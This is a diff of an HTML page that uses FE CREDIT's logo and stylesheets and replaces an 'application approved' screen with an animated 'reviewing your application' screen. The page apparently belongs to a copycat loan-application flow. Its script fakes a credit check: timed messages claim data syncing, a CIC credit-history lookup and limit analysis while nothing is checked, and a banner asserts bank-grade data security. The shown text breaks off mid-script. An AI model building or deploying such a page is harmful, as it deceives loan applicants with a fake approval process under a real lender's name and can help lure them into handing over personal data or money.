@@ -1,14 +1,22 @@
 <!DOCTYPE html>
-<html dir="ltr" lang="vi" class="no-js usn">
+<html dir="ltr" lang="vi">
   <head>
     <meta charset="UTF-8" />
     <meta
       name="viewport"
       content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover"
     />
-    <title>FE CREDIT - Hồ sơ của bạn đả được duyệt - VAY TIÊU DÙNG TÍN CHẤP</title>
+    <title>FE CREDIT - Đang xét duyệt hồ sơ - VAY TIÊU DÙNG TÍN CHẤP</title>
 
-    <!-- External CSS Bundles from FE CREDIT -->
+    <!-- ============================================
+         EXTERNAL RESOURCES
+         - FE CREDIT CSS Bundles
+         - Bootstrap 5.3
+         - Font Awesome 6.4
+         - Inter Font (Neobank Style)
+         ============================================ -->
+    
+    <!-- FE CREDIT External CSS Bundles -->
     <link
       href="https://www.fecredit.com.vn/sb/sitebuilder-ltr-css-bundle.css.ve71a07e0be8131442699d18627f92642a8170edc"
       media="screen"
@@ -40,100 +48,125 @@
       rel="stylesheet"
     />
 
-    <!-- Core Libraries -->
+    <!-- Bootstrap 5.3 -->
     <link
       href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
       rel="stylesheet"
     />
+    
+    <!-- Font Awesome 6.4 -->
     <link
       rel="stylesheet"
       href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
     />
+    
+    <!-- Inter Font (Neobank Style) -->
     <link
       href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
       rel="stylesheet"
     />
+    
+    <!-- Favicon -->
     <link rel="icon" href="https://fecredit.com.vn/favicon.ico" />
 
-    <!-- FECredit Design System -->
-    <link
-      rel="stylesheet"
-      href="../../configs/shared/fecredit-design-system.css"
-    />
-    <link rel="stylesheet" href="../../configs/shared/fecredit-components.css" />
-    <!-- Unified Design Tokens -->
-    <link
-      rel="stylesheet"
-      href="../../configs/shared/fecredit-design-tokens.css"
-    />
-
-    <!-- Local step styles -->
+    <!-- FECredit Design System (Local) -->
     <link rel="stylesheet" href="unified-design-system.css" />
     <link rel="stylesheet" href="mobile-accessibility.css" />
     <link rel="stylesheet" href="step1-style-guide.css" />
 
+    <!-- CryptoJS for localStorage encryption (if needed) -->
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-    <script src="../../simple-navigation.js"></script>
 
+    <!-- ============================================
+         NEOBANK STYLE CSS - MOBILE FIRST
+         Design: Modern Digital Bank Aesthetic
+         Colors: #00994F (primary), #015C2E (dark)
+         ============================================ -->
     <style>
+      /* ============================================
+         CSS VARIABLES - BRAND COLORS
+         ============================================ */
       :root {
+        /* Primary Brand Colors */
         --fe-primary: #00994f;
-        --fe-primary-dark: #00763e;
+        --fe-primary-dark: #015c2e;
         --fe-primary-light: #b9f6ca;
+        --fe-primary-glow: rgba(0, 153, 79, 0.25);
+        
+        /* Semantic Colors */
+        --fe-success: #10b981;
+        --fe-success-bg: #d1fae5;
+        
+        /* Neutral Colors */
         --fe-soft-green: #e8f5e9;
-        --fe-bg-page: #f5f7fa;
+        --fe-bg-page: #f8fafc;
+        --fe-bg-card: #ffffff;
         --fe-text-main: #111827;
-        --fe-text-muted: #4b5563;
+        --fe-text-muted: #6b7280;
+        --fe-text-light: #9ca3af;
+        
+        /* Design Tokens */
         --fe-radius-lg: 24px;
+        --fe-radius-md: 16px;
         --fe-radius-pill: 999px;
         --fe-shadow-soft: 0 10px 40px rgba(0, 0, 0, 0.08);
+        --fe-shadow-card: 0 20px 60px rgba(0, 0, 0, 0.12);
+        
+        /* Animation Timings */
+        --fe-anim-fast: 0.2s;
+        --fe-anim-normal: 0.4s;
+        --fe-anim-slow: 0.8s;
       }
 
-      * {
+      /* ============================================
+         RESET & BASE STYLES
+         ============================================ */
+      *,
+      *::before,
+      *::after {
         box-sizing: border-box;
+        margin: 0;
+        padding: 0;
       }
 
       html,
       body {
-        margin: 0;
-        padding: 0;
         width: 100%;
         max-width: 100%;
         overflow-x: hidden;
         font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont,
-          "Segoe UI", sans-serif;
-        background-color: var(--background-color, var(--fe-bg-page));
-        color: var(--text-primary, var(--fe-text-main));
+          "Segoe UI", Roboto, sans-serif;
+        font-size: 16px;
+        line-height: 1.5;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        background-color: var(--fe-bg-page);
+        color: var(--fe-text-main);
       }
 
       body {
         display: flex;
         flex-direction: column;
         min-height: 100vh;
+        min-height: 100dvh; /* Dynamic viewport height for mobile */
       }
 
-      main {
-        flex: 1 0 auto;
-      }
-
-      /* ====== GLOBAL HIDE/SHOW HELPERS ====== */
-      .is-hidden {
-        display: none !important;
-      }
-
-      /* ====== TOP BAR ====== */
-
-      .fe-topbar-placeholder {
+      /* ============================================
+         HEADER - TOP BAR
+         ============================================ */
+      .fe-topbar {
         width: 100%;
-        background-color: #ffffff;
+        background-color: var(--fe-bg-card);
         box-shadow: 0 1px 3px rgba(15, 23, 42, 0.06);
-        z-index: 10;
+        position: sticky;
+        top: 0;
+        z-index: 100;
       }
 
       .fe-topbar-inner {
         max-width: 960px;
         margin: 0 auto;
-        padding: 10px 16px;
+        padding: 12px 16px;
         display: flex;
         align-items: center;
         justify-content: space-between;
@@ -143,732 +176,621 @@
       .fe-topbar-logo {
         display: flex;
         align-items: center;
-        gap: 8px;
       }
 
       .fe-topbar-logo img {
-        height: 26px;
+        height: 28px;
         width: auto;
       }
 
       .fe-topbar-actions {
         display: flex;
         align-items: center;
-        gap: 12px;
-        font-size: 0.875rem;
-        color: #4b5563;
+        gap: 8px;
       }
 
       .fe-topbar-icon-btn {
+        width: 40px;
+        height: 40px;
         border: none;
         background: transparent;
-        padding: 4px;
-        border-radius: 999px;
+        border-radius: var(--fe-radius-pill);
         display: flex;
         align-items: center;
         justify-content: center;
-        color: #4b5563;
+        color: var(--fe-text-muted);
+        cursor: pointer;
+        transition: background-color var(--fe-anim-fast) ease;
+      }
+
+      .fe-topbar-icon-btn:hover,
+      .fe-topbar-icon-btn:focus {
+        background-color: var(--fe-soft-green);
+        color: var(--fe-primary);
       }
 
       .fe-topbar-icon-btn i {
-        font-size: 1rem;
+        font-size: 1.1rem;
       }
 
-      /* ====== SUB HEADER ====== */
-
-      .subheader-segment {
-        width: 100%;
-        background-color: var(--fe-soft-green);
-        border-bottom: 1px solid rgba(0, 153, 79, 0.15);
-      }
-
-      .subheader-inner {
-        max-width: 960px;
-        margin: 0 auto;
-        padding: 10px 16px;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        gap: 8px;
-      }
-
-      .subheader-label {
-        font-size: 0.9rem;
-        font-weight: 500;
-        color: var(--fe-primary-dark);
-        white-space: nowrap;
-      }
-
-      .subheader-label span {
-        font-weight: 600;
-      }
-
-      .subheader-toggle {
-        margin-left: auto;
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-        border-radius: var(--fe-radius-pill);
-        padding: 6px 10px;
-        border: 1px solid rgba(0, 153, 79, 0.2);
-        background: rgba(255, 255, 255, 0.7);
-        font-size: 0.75rem;
-        color: var(--fe-primary-dark);
-      }
-
-      .subheader-toggle i {
-        font-size: 0.8rem;
-      }
-
-      /* ====== PAGE LAYOUT ====== */
-
-      .success-page-wrapper {
-        width: 100%;
-        max-width: 960px;
-        margin: 0 auto;
-        padding: 16px 16px 24px;
+      /* ============================================
+         MAIN CONTENT - APPROVAL SCREEN
+         ============================================ */
+      .approval-page {
+        flex: 1;
         display: flex;
         flex-direction: column;
-        align-items: center;
-      }
-
-      .success-card {
-        width: 100%;
-        max-width: 480px;
-        background-color: #ffffff;
-        border-radius: var(--fe-radius-lg);
-        box-shadow: var(--fe-shadow-soft);
-        padding: 24px 20px 20px;
-        margin-top: 12px;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-      }
-
-      @media (min-width: 576px) {
-        .success-card {
-          padding: 28px 24px 22px;
-          margin-top: 20px;
-        }
-      }
-
-      /* ====== SUCCESS HERO ====== */
-
-      .success-hero {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        padding: 8px 4px 4px;
-      }
-
-      .success-icon-wrapper {
-        width: 112px;
-        height: 112px;
-        border-radius: 50%;
-        background: radial-gradient(
-          circle at 30% 20%,
-          #00c853 0,
-          #00994f 60%,
-          #00763e 100%
-        );
-        display: flex;
         align-items: center;
         justify-content: center;
-        color: #ffffff;
-        box-shadow:
-          0 18px 45px rgba(0, 153, 79, 0.36),
-          0 0 0 8px rgba(0, 153, 79, 0.12);
-        margin-bottom: 16px;
-        position: relative;
+        padding: 24px 16px;
+        min-height: calc(100vh - 120px);
+        min-height: calc(100dvh - 120px);
       }
 
-      .success-icon-wrapper::after {
+      .approval-card {
+        width: 100%;
+        max-width: 420px;
+        background: var(--fe-bg-card);
+        border-radius: var(--fe-radius-lg);
+        box-shadow: var(--fe-shadow-card);
+        padding: 32px 24px;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      /* Subtle gradient accent at top of card */
+      .approval-card::before {
         content: "";
         position: absolute;
-        inset: 6px;
-        border-radius: inherit;
-        border: 1px solid rgba(255, 255, 255, 0.3);
-      }
-
-      .success-icon-wrapper i {
-        font-size: 2.6rem;
-        z-index: 1;
-      }
-
-      .success-title {
-        font-size: 1.35rem;
-        font-weight: 700;
-        color: var(--fe-text-main);
-        margin-bottom: 12px;
-      }
-
-      .success-copy {
-        font-size: 0.92rem;
-        color: var(--fe-text-muted);
-        line-height: 1.6;
-        max-width: 420px;
-      }
-
-      .success-copy p {
-        margin: 0 0 6px;
-      }
-
-      .success-copy p:last-child {
-        margin-bottom: 0;
-      }
-
-      /* ====== ACTION BUTTONS ====== */
-
-      .success-actions {
-        width: 100%;
-        display: flex;
-        gap: 10px;
-        margin-top: 20px;
-        margin-bottom: 12px;
-      }
-
-      .success-btn {
-        flex: 1 1 0;
-        min-height: 44px;
-        border-radius: var(--fe-radius-pill);
-        font-size: 0.94rem;
-        font-weight: 600;
-        border: 1px solid transparent;
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-        cursor: pointer;
-        transition: all 0.18s ease-out;
-        font-family: inherit;
-        white-space: nowrap;
-      }
-
-      .success-btn-skip {
-        background-color: #ffffff;
-        color: var(--fe-primary);
-        border-color: var(--fe-primary);
-      }
-
-      .success-btn-skip:hover {
-        background-color: rgba(0, 153, 79, 0.06);
-      }
-
-      .success-btn-continue {
-        background: linear-gradient(90deg, #ccff90, #b2ff59);
-        color: #064e3b;
-        border-color: transparent;
-        box-shadow: 0 8px 20px rgba(132, 204, 22, 0.35);
-      }
-
-      .success-btn-continue:hover {
-        filter: brightness(0.98);
-        transform: translateY(-1px);
-      }
-
-      @media (max-width: 360px) {
-        .success-actions {
-          flex-direction: column;
-        }
-      }
-
-      /* ====== CONDITIONS SECTION ====== */
-
-      .conditions-section {
-        width: 100%;
-        padding-top: 12px;
-        border-top: 1px dashed rgba(148, 163, 184, 0.5);
-        margin-top: 12px;
-      }
-
-      .conditions-header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        gap: 8px;
-        margin-bottom: 10px;
-      }
-
-      .conditions-title {
-        font-size: 0.86rem;
-        letter-spacing: 0.08em;
-        font-weight: 700;
-        color: var(--fe-primary);
-      }
-
-      .conditions-badge {
-        font-size: 0.7rem;
-        padding: 4px 8px;
-        border-radius: var(--fe-radius-pill);
-        background-color: rgba(0, 153, 79, 0.06);
-        color: var(--fe-primary-dark);
-        font-weight: 500;
-      }
-
-      .conditions-list {
-        display: flex;
-        flex-direction: column;
-        gap: 8px;
-      }
-
-      .condition-card {
-        border-radius: 16px;
-        background-color: var(--fe-soft-green);
-        padding: 10px 12px;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        gap: 12px;
-      }
-
-      .condition-text-group {
-        display: flex;
-        flex-direction: column;
-        gap: 2px;
-        font-size: 0.86rem;
-      }
-
-      .condition-label {
-        font-size: 0.78rem;
-        text-transform: uppercase;
-        letter-spacing: 0.04em;
-        color: #6b7280;
-        font-weight: 600;
-      }
-
-      .condition-value {
-        font-size: 0.9rem;
-        font-weight: 700;
-        color: var(--fe-text-main);
-      }
-
-      .condition-icon {
-        flex-shrink: 0;
-        width: 32px;
-        height: 32px;
-        border-radius: 999px;
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-        background: rgba(0, 153, 79, 0.08);
-        color: var(--fe-primary-dark);
-      }
-
-      .condition-icon i {
-        font-size: 1rem;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+        background: linear-gradient(90deg, var(--fe-primary), var(--fe-primary-light));
       }
 
       @media (min-width: 576px) {
-        .condition-card {
-          padding: 12px 14px;
+        .approval-card {
+          padding: 40px 32px;
         }
       }
 
-      /* ====== FOOTER PLACEHOLDER ====== */
-
-      .fe-footer-placeholder {
-        width: 100%;
-        padding: 12px 0 16px;
-        text-align: center;
-        font-size: 0.75rem;
-        color: #9ca3af;
-      }
-
-      /* =========================================================
-         LOADING OVERLAY (30s APPROVAL SIMULATION)
-         ========================================================= */
-
-      .approval-loading-overlay {
-        position: fixed;
-        inset: 0;
-        background: radial-gradient(
-            circle at top,
-            rgba(0, 153, 79, 0.18),
-            transparent 55%
-          ),
-          #f1f5f9;
+      /* ============================================
+         RADAR ANIMATION CONTAINER
+         ============================================ */
+      .radar-container {
+        position: relative;
+        width: 160px;
+        height: 160px;
+        margin: 0 auto 24px;
         display: flex;
-        flex-direction: column;
         align-items: center;
         justify-content: center;
-        z-index: 9999;
-        padding: 16px;
       }
 
-      .approval-loading-card {
-        width: 100%;
-        max-width: 360px;
-        background: #ffffff;
-        border-radius: 20px;
-        box-shadow: 0 18px 45px rgba(15, 23, 42, 0.14);
-        padding: 24px 20px 18px;
-        text-align: center;
-      }
-
-      .loading-circle-wrapper {
-        width: 140px;
-        height: 140px;
-        margin: 0 auto 16px;
-        position: relative;
-      }
-
-      .loading-circle-wrapper svg {
+      /* Radar Scanning Waves */
+      .radar-wave {
+        position: absolute;
         width: 100%;
         height: 100%;
-        transform: rotate(-90deg);
-        filter: drop-shadow(0 4px 12px rgba(0, 153, 79, 0.18));
+        border: 2px solid var(--fe-primary);
+        border-radius: 50%;
+        opacity: 0;
+        animation: radar-pulse 2.5s ease-out infinite;
       }
 
-      .loading-bg {
-        fill: none;
-        stroke: #e5e7eb;
-        stroke-width: 10;
+      .radar-wave:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .radar-wave:nth-child(2) {
+        animation-delay: 0.6s;
+      }
+      .radar-wave:nth-child(3) {
+        animation-delay: 1.2s;
       }
 
-      .loading-progress {
-        fill: none;
-        stroke: var(--fe-primary);
-        stroke-width: 10;
-        stroke-linecap: round;
-        stroke-dasharray: 440; /* ~2πr for r=70 */
-        stroke-dashoffset: 440;
-        transition: stroke-dashoffset 0.2s linear;
+      @keyframes radar-pulse {
+        0% {
+          transform: scale(0.5);
+          opacity: 0.8;
+        }
+        100% {
+          transform: scale(1.4);
+          opacity: 0;
+        }
       }
 
-      .loading-center-text {
-        position: absolute;
-        inset: 0;
+      /* Center Icon Circle */
+      .radar-center {
+        position: relative;
+        width: 100px;
+        height: 100px;
+        background: linear-gradient(135deg, var(--fe-primary) 0%, var(--fe-primary-dark) 100%);
+        border-radius: 50%;
         display: flex;
         align-items: center;
         justify-content: center;
-        font-size: 1.2rem;
-        font-weight: 700;
-        color: var(--fe-primary-dark);
+        box-shadow: 
+          0 8px 30px var(--fe-primary-glow),
+          0 0 0 8px rgba(0, 153, 79, 0.1);
+        z-index: 2;
       }
 
-      .loading-title {
-        font-size: 1.05rem;
+      .radar-center i {
+        font-size: 2.5rem;
+        color: #ffffff;
+      }
+
+      /* Success State - When complete */
+      .radar-container.is-complete .radar-wave {
+        animation: none;
+        opacity: 0;
+      }
+
+      .radar-container.is-complete .radar-center {
+        background: linear-gradient(135deg, var(--fe-success) 0%, #059669 100%);
+        animation: success-bounce 0.5s ease;
+      }
+
+      @keyframes success-bounce {
+        0%, 100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.1);
+        }
+      }
+
+      /* ============================================
+         STATUS TEXT - PROCESSING STEPS
+         ============================================ */
+      .status-title {
+        font-size: 1.25rem;
         font-weight: 700;
         color: var(--fe-text-main);
-        margin-bottom: 6px;
+        margin-bottom: 8px;
       }
 
-      .loading-subtitle {
-        font-size: 0.9rem;
+      .status-message {
+        font-size: 0.95rem;
         color: var(--fe-text-muted);
-        line-height: 1.5;
-        margin-bottom: 10px;
-      }
-
-      .loading-note {
-        font-size: 0.82rem;
-        color: #9ca3af;
-        line-height: 1.4;
-      }
-
-      .loading-warning {
-        margin-top: 8px;
-        font-size: 0.82rem;
-        color: #b45309;
-        background: #fffbeb;
-        border-radius: 999px;
-        padding: 6px 10px;
-        display: inline-flex;
+        min-height: 48px;
+        display: flex;
         align-items: center;
-        gap: 6px;
+        justify-content: center;
+        transition: opacity var(--fe-anim-fast) ease;
       }
 
-      .loading-warning i {
-        font-size: 0.9rem;
+      .status-message.fade-out {
+        opacity: 0;
       }
 
-      .loading-countdown {
-        margin-top: 8px;
+      /* Typing Dots Animation */
+      .typing-dots {
+        display: inline-flex;
+        gap: 4px;
+        margin-left: 6px;
+      }
+
+      .typing-dots span {
+        width: 6px;
+        height: 6px;
+        background-color: var(--fe-primary);
+        border-radius: 50%;
+        animation: typing-bounce 1.2s infinite ease-in-out;
+      }
+
+      .typing-dots span:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .typing-dots span:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .typing-dots span:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+
+      @keyframes typing-bounce {
+        0%, 60%, 100% {
+          transform: translateY(0);
+        }
+        30% {
+          transform: translateY(-6px);
+        }
+      }
+
+      /* Success Message State */
+      .status-message.is-success {
+        color: var(--fe-success);
+        font-weight: 600;
+      }
+
+      .status-message.is-success i {
+        margin-right: 6px;
+        font-size: 1.1rem;
+      }
+
+      /* ============================================
+         PROGRESS STEPS INDICATOR
+         ============================================ */
+      .progress-steps {
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        margin-top: 24px;
+        padding-top: 20px;
+        border-top: 1px solid rgba(0, 0, 0, 0.06);
+      }
+
+      .progress-step {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background-color: #e5e7eb;
+        transition: all var(--fe-anim-normal) ease;
+      }
+
+      .progress-step.is-active {
+        background-color: var(--fe-primary);
+        transform: scale(1.2);
+      }
+
+      .progress-step.is-complete {
+        background-color: var(--fe-success);
+      }
+
+      /* ============================================
+         SECURITY NOTE
+         ============================================ */
+      .security-note {
+        margin-top: 20px;
+        padding: 12px 16px;
+        background: linear-gradient(135deg, #f0fdf4 0%, #ecfdf5 100%);
+        border-radius: var(--fe-radius-md);
+        border: 1px solid rgba(0, 153, 79, 0.15);
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 0.85rem;
+        color: var(--fe-primary-dark);
+        text-align: left;
+      }
+
+      .security-note i {
+        font-size: 1.2rem;
+        color: var(--fe-primary);
+        flex-shrink: 0;
+      }
+
+      /* ============================================
+         FOOTER
+         ============================================ */
+      .fe-footer {
+        width: 100%;
+        padding: 16px;
+        text-align: center;
         font-size: 0.8rem;
-        color: #6b7280;
+        color: var(--fe-text-light);
+        background-color: var(--fe-bg-page);
       }
 
-      @media (max-width: 400px) {
-        .approval-loading-card {
-          padding: 20px 16px 16px;
-        }
-        .loading-circle-wrapper {
-          width: 120px;
-          height: 120px;
-        }
-        .loading-center-text {
-          font-size: 1.05rem;
+      .fe-footer a {
+        color: var(--fe-primary);
+        text-decoration: none;
+      }
+
+      .fe-footer a:hover {
+        text-decoration: underline;
+      }
+
+      /* ============================================
+         ACCESSIBILITY UTILITIES
+         ============================================ */
+      .visually-hidden {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+      }
+
+      /* Focus visible for keyboard navigation */
+      :focus-visible {
+        outline: 2px solid var(--fe-primary);
+        outline-offset: 2px;
+      }
+
+      /* Reduce motion for users who prefer it */
+      @media (prefers-reduced-motion: reduce) {
+        *,
+        *::before,
+        *::after {
+          animation-duration: 0.01ms !important;
+          animation-iteration-count: 1 !important;
+          transition-duration: 0.01ms !important;
         }
       }
     </style>
   </head>
 
   <body>
-    <!-- LOADING OVERLAY (shows first 30s) -->
-    <div
-      id="approvalLoadingOverlay"
-      class="approval-loading-overlay"
-      role="alert"
-      aria-live="polite"
-    >
-      <div class="approval-loading-card">
-        <div class="loading-circle-wrapper" aria-hidden="true">
-          <svg viewBox="0 0 160 160">
-            <circle
-              class="loading-bg"
-              cx="80"
-              cy="80"
-              r="70"
-            ></circle>
-            <circle
-              id="loadingProgressCircle"
-              class="loading-progress"
-              cx="80"
-              cy="80"
-              r="70"
-            ></circle>
-          </svg>
-          <div id="loadingPercentText" class="loading-center-text">0%</div>
-        </div>
-        <div class="loading-title">Vui lòng đợi</div>
-        <div class="loading-subtitle">
-          Quy trình xét duyệt đang diễn ra. Hệ thống đang xử lý thông tin đăng
-          ký của quý khách.
-        </div>
-        <div class="loading-note">
-          Để đảm bảo dữ liệu không bị gián đoạn,
-          <strong>vui lòng không thoát hoặc đóng trang</strong> trong lúc chờ.
-        </div>
-        <div class="loading-warning">
-          <i class="fa-solid fa-triangle-exclamation"></i>
-          <span>Không tắt trình duyệt hoặc đổi sang tab khác quá lâu.</span>
-        </div>
-        <div id="loadingCountdown" class="loading-countdown">
-          Thời gian còn lại: <strong>30 giây</strong>
-        </div>
-      </div>
-    </div>
-
-    <!-- Top bar -->
-    <header class="fe-topbar-placeholder" aria-label="Thanh điều hướng FE CREDIT">
+    <!-- ============================================
+         HEADER - TOP BAR WITH LOGO
+         ============================================ -->
+    <header class="fe-topbar" role="banner">
       <div class="fe-topbar-inner">
+        <!-- Logo -->
         <div class="fe-topbar-logo">
-          <a href="/" aria-label="FE CREDIT - Vay tiêu dùng tín chấp">
+          <a href="/" aria-label="Trang chủ FE CREDIT">
             <img
               src="https://www.fecredit.com.vn/sb/themes/fecredit/images/fecredit-logo.svg"
               alt="FE CREDIT"
-              loading="lazy"
+              loading="eager"
             />
           </a>
         </div>
+        
+        <!-- Action Buttons -->
         <div class="fe-topbar-actions">
           <button
             class="fe-topbar-icon-btn"
             type="button"
             aria-label="Tìm kiếm"
           >
-            <i class="fa-solid fa-magnifying-glass"></i>
+            <i class="fa-solid fa-magnifying-glass" aria-hidden="true"></i>
           </button>
           <button
             class="fe-topbar-icon-btn"
             type="button"
-            aria-label="Mở menu"
+            aria-label="Mở menu điều hướng"
           >
-            <i class="fa-solid fa-bars"></i>
+            <i class="fa-solid fa-bars" aria-hidden="true"></i>
           </button>
         </div>
       </div>
     </header>
 
-    <!-- Sub-header -->
-    <section class="subheader-segment" aria-label="Loại khách hàng">
-      <div class="subheader-inner">
-        <div class="subheader-label">
-          Tôi là <span>Khách hàng cá nhân</span>
-        </div>
-        <button
-          class="subheader-toggle"
-          type="button"
-          aria-label="Thay đổi loại khách hàng"
-        >
-          <span>Thay đổi</span>
-          <i class="fa-solid fa-chevron-down"></i>
-        </button>
-      </div>
-    </section>
-
-    <!-- Main success content -->
-    <main class="success-page-wrapper" id="successContent" aria-hidden="true">
-      <section
-        class="success-card"
-        aria-labelledby="success-title"
-        aria-describedby="success-description"
+    <!-- ============================================
+         MAIN CONTENT - APPROVAL ANIMATION
+         ============================================ -->
+    <main class="approval-page" role="main">
+      <article 
+        class="approval-card"
+        role="status"
+        aria-live="polite"
+        aria-atomic="true"
+        aria-label="Trạng thái xét duyệt hồ sơ"
       >
-        <!-- Success status -->
-        <div class="success-hero">
-          <div class="success-icon-wrapper" aria-hidden="true">
-            <i class="fa-solid fa-check"></i>
-          </div>
-          <h1 id="success-title" class="success-title">
-            Đăng ký thành công!
-          </h1>
-          <div id="success-description" class="success-copy">
-            <p>
-              Xin chân thành cảm ơn quý khách đã tin tưởng và lựa chọn dịch vụ
-              của FE CREDIT.
-            </p>
-            <p>
-              Thông tin của quý khách đã được ghi nhận. Để phục vụ quý khách
-              tốt hơn, rất mong nhận được thêm thông tin chi tiết.
-            </p>
-          </div>
-        </div>
-
-        <!-- Actions -->
-        <div class="success-actions" role="group" aria-label="Tùy chọn tiếp tục">
-          <button
-            type="button"
-            class="success-btn success-btn-skip"
-            id="btnSkip"
-          >
-            Bỏ qua
-          </button>
-          <button
-            type="button"
-            class="success-btn success-btn-continue"
-            id="btnContinue"
-          >
-            Tiếp tục
-          </button>
-        </div>
-
-        <!-- Conditions -->
-        <section
-          class="conditions-section"
-          aria-labelledby="conditions-title"
+        <!-- Radar Animation Container -->
+        <div 
+          id="radarContainer" 
+          class="radar-container"
+          aria-hidden="true"
         >
-          <div class="conditions-header">
-            <h2 id="conditions-title" class="conditions-title">
-              ĐIỀU KIỆN ĐĂNG KÝ
-            </h2>
-            <span class="conditions-badge">Áp dụng cho sản phẩm hiện tại</span>
+          <!-- Radar Waves (Scanning Effect) -->
+          <div class="radar-wave"></div>
+          <div class="radar-wave"></div>
+          <div class="radar-wave"></div>
+          
+          <!-- Center Icon (Shield/Document) -->
+          <div class="radar-center">
+            <i id="centerIcon" class="fa-solid fa-shield-halved"></i>
           </div>
-          <div class="conditions-list">
-            <!-- Card 1: Quốc tịch -->
-            <article class="condition-card">
-              <div class="condition-text-group">
-                <span class="condition-label">Quốc tịch</span>
-                <span class="condition-value">Công dân Việt Nam</span>
-              </div>
-              <div class="condition-icon" aria-hidden="true">
-                <i class="fa-solid fa-flag"></i>
-              </div>
-            </article>
+        </div>
 
-            <!-- Card 2: Độ tuổi -->
-            <article class="condition-card">
-              <div class="condition-text-group">
-                <span class="condition-label">Độ tuổi</span>
-                <span class="condition-value">Từ 20–60 tuổi</span>
-              </div>
-              <div class="condition-icon" aria-hidden="true">
-                <i class="fa-solid fa-user"></i>
-              </div>
-            </article>
+        <!-- Status Title -->
+        <h1 id="statusTitle" class="status-title">
+          Đang xét duyệt hồ sơ
+        </h1>
 
-            <!-- Card 3: Thu nhập -->
-            <article class="condition-card">
-              <div class="condition-text-group">
-                <span class="condition-label">Thu nhập</span>
-                <span class="condition-value">3 triệu đồng/tháng</span>
-              </div>
-              <div class="condition-icon" aria-hidden="true">
-                <i class="fa-solid fa-sack-dollar"></i>
-              </div>
-            </article>
-          </div>
-        </section>
-      </section>
+        <!-- Dynamic Status Message -->
+        <p id="statusMessage" class="status-message">
+          <span id="statusText">Đang đồng bộ dữ liệu</span>
+          <span class="typing-dots" id="typingDots">
+            <span></span>
+            <span></span>
+            <span></span>
+          </span>
+        </p>
+
+        <!-- Progress Steps Indicator -->
+        <div class="progress-steps" role="progressbar" aria-valuenow="1" aria-valuemin="1" aria-valuemax="4">
+          <div id="step1" class="progress-step is-active" aria-label="Bước 1: Đồng bộ dữ liệu"></div>
+          <div id="step2" class="progress-step" aria-label="Bước 2: Tra cứu CIC"></div>
+          <div id="step3" class="progress-step" aria-label="Bước 3: Phân tích hạn mức"></div>
+          <div id="step4" class="progress-step" aria-label="Bước 4: Hoàn tất"></div>
+        </div>
+
+        <!-- Security Note -->
+        <div class="security-note">
+          <i class="fa-solid fa-lock" aria-hidden="true"></i>
+          <span>Thông tin của bạn được bảo mật theo tiêu chuẩn ngân hàng</span>
+        </div>
+
+        <!-- Screen reader announcement -->
+        <div id="srAnnouncement" class="visually-hidden" aria-live="assertive"></div>
+      </article>
     </main>
 
-    <footer class="fe-footer-placeholder">
-      © FE CREDIT. Tất cả các quyền được bảo lưu.
+    <!-- ============================================
+         FOOTER
+         ============================================ -->
+    <footer class="fe-footer" role="contentinfo">
+      <p>© 2024 <a href="https://www.fecredit.com.vn">FE CREDIT</a>. Tất cả các quyền được bảo lưu.</p>
     </footer>
 
+    <!-- ============================================
+         JAVASCRIPT - APPROVAL SIMULATION LOGIC
+         Tổng thời gian: ~7 giây
+         - Giai đoạn 1: 1.5 giây
+         - Giai đoạn 2: 2 giây
+         - Giai đoạn 3: 2 giây
+         - Giai đoạn 4: 1.5 giây (hiển thị thành công rồi chuyển trang)
+         ============================================ -->
     <script>
-      (function () {
-        var btnSkip = document.getElementById("btnSkip");
-        var btnContinue = document.getElementById("btnContinue");
+      (function() {
+        'use strict';
 
-        if (btnSkip) {
-          btnSkip.addEventListener("click", function () {
-            if (typeof goToNextStep === "function") {
-              goToNextStep("skip");
-            } else {
-              window.location.href = "../index.html";
+        // ============================================
+        // DOM ELEMENTS
+        // ============================================
+        var radarContainer = document.getElementById('radarContainer');
+        var centerIcon = document.getElementById('centerIcon');
+        var statusTitle = document.getElementById('statusTitle');
+        var statusMessage = document.getElementById('statusMessage');
+        var statusText = document.getElementById('statusText');
+        var typingDots = document.getElementById('typingDots');
+        var srAnnouncement = document.getElementById('srAnnouncement');
+        
+        // Progress steps
+        var steps = [
+          document.getElementById('step1'),
+          document.getElementById('step2'),
+          document.getElementById('step3'),
+          document.getElementById('step4')
+        ];
+
+        // ============================================
+        // CONFIGURATION - PROCESSING STAGES
+        // Mô phỏng quy trình ngân hàng thực tế
+        // ============================================
+        var stages = [
+          {
+            message: 'Đang đồng bộ dữ liệu',
+            duration: 1500, // 1.5 giây
+            icon: 'fa-solid fa-shield-halved'
+          },
+          {
+            message: 'Đang tra cứu lịch sử tín dụng (CIC)',
+            duration: 2000, // 2 giây
+            icon: 'fa-solid fa-database'
+          },
+          {
